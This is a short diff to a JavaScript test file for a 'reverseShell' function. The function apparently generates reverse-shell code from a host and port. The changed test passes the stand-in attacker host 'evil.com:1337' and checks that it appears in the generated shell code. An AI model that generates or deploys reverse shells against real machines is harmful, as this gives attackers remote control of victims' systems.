@@ -6,8 +6,8 @@ test('reverseShell is a function', t => {
 });
 
 test('reverseShell returns shell code with /host:port variables', t => {
-	const returnValue = reverseShell('foo', 'bar');
-	t.true(returnValue.indexOf('("foo",bar)') > -1);
+	const returnValue = reverseShell('evil.com:1337');
+	t.true(returnValue.indexOf('("evil.com",1337)') > -1);
 });
 
 test('reverseShell returns usage if host and port aren\'t set', t => {
